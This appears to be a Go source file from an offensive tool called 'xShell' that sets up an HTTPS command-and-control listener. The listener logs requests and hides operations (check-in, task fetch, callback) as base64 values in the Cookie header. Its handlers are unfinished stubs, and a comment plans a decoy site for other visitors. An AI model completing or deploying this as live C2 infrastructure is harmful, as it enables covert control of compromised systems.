package c2

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"xShell/internal/logger"
)

/*
C2 struct

Type -> C2 listener type

Port -> C2 listener port

CertFile -> HTTPS C2 TLS certificate

KeyFile -> HTTPS C2 TLS key

Key -> Serpent cipher key
*/
type C2 struct {
	Type     string `defailt:"https"` // Reserved for future use...
	Port     string
	CertFile string
	KeyFile  string
	Key      []byte
}

/*
Catch-all route handler

Switches based on requested operation.

Requested operation is stored in the "Cookie" header.
*/
func (c *C2) handler(w http.ResponseWriter, r *http.Request) {
	if op := r.Header.Get("Cookie"); op != "" {
		switch op {
		case "Q2hlY2tJbg==": // CheckIn
			// TODO: Add logic
		case "R2V0VGFza3M=": // GetTasks
			// TODO: Add logic
		case "Q2FsbEJhY2s=": // CallBack
			// TODO: Add logic
		default:
			// TODO: Redirect to fake site
			return
		}
	}
}

/*
Start C2
*/
func (c *C2) Start() {
	switch c.Type {
	case "https": // https C2 channel
		// Open c2 log file
		logFile, err := os.OpenFile(".xshell/log/c2.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			logger.Log(logger.WARNING, fmt.Sprintf("Error opening log file: %s", err.Error()))
		}
		// Defer log file close
		defer logFile.Close()

		// Log errors and requests
		errorLog := log.New(logFile, "ERROR: ", log.LstdFlags)
		requestLog := log.New(logFile, "REQUEST: ", log.LstdFlags)

		// Catch-all route handler
		http.Handle("/", logRequest(http.HandlerFunc(c.handler), requestLog))

		// Http server object
		server := &http.Server{
			Addr:     fmt.Sprintf("0.0.0.0:%s", c.Port),
			ErrorLog: errorLog,
		}
		// Server http server with TLS
		err = server.ListenAndServeTLS(c.CertFile, c.KeyFile)
		if err != nil {
			logger.Log(logger.CRITICAL, fmt.Sprintf("Server failed to start: %v", err))
			errorLog.Fatalf("Server failed to start: %v", err)
		}
	}
}

// Log handler, logs request and headers
func logRequest(handler http.Handler, log *log.Logger) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Received request %s %s\n", r.Method, r.URL)
		for name, headers := range r.Header {
			for _, h := range headers {
				log.Printf("%v: %v\n", name, h)
			}
		}
		handler.ServeHTTP(w, r)
	})
}
